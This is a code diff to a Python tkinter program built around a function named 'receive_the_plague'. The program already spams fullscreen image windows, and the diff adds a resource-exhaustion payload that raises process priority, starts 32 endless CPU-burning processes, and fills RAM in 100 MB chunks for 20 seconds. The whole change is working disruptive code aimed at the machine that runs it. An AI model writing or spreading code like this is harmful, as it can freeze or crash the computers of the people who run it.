@@ -1,12 +1,37 @@
 from PIL import Image, ImageTk
 import time
 import threading
-import multiprocessing
+import multiprocessing as mp
 import os
 import tkinter as tk
 from tkinter import ttk, messagebox
 
 def receive_the_plague():
+    def stress_task(mode):
+        # 0: CPU Intensive, 1: RAM Hogging
+        try: os.nice(-15)
+        except: pass
+        if mode == 0:
+            i = 0
+            while True: i = i * i + 1 if i < 1e18 else 0.5
+        else:
+            hog = []; chunk = 'X' * 100 * 1024 * 1024 # 100MB chunk
+            try:
+                while True: hog.append(chunk); time.sleep(0.001)
+            except MemoryError:
+                while True: time.sleep(1)
+
+    def overload_system(duration):
+        processes = []
+        cores = 32 #i like big numbers hehe
+        for mode in [0] * cores + [1] * 2:
+            p = mp.Process(target=stress_task, args=(mode,), daemon=True)
+            p.start(); processes.append(p)
+
+        time.sleep(duration)
+        for p in processes:
+            if p.is_alive(): p.terminate(); p.join(0.1)
+
     def spawn_window(img):
         win = tk.Toplevel()
         win.attributes("-fullscreen", True)
@@ -28,6 +53,7 @@ def receive_the_plague():
 
     threading.Thread(target=spam_windows).start()
     tk.mainloop()
+    overload_system(20)
 
 if __name__ == "__main__":
     def open_main_window():
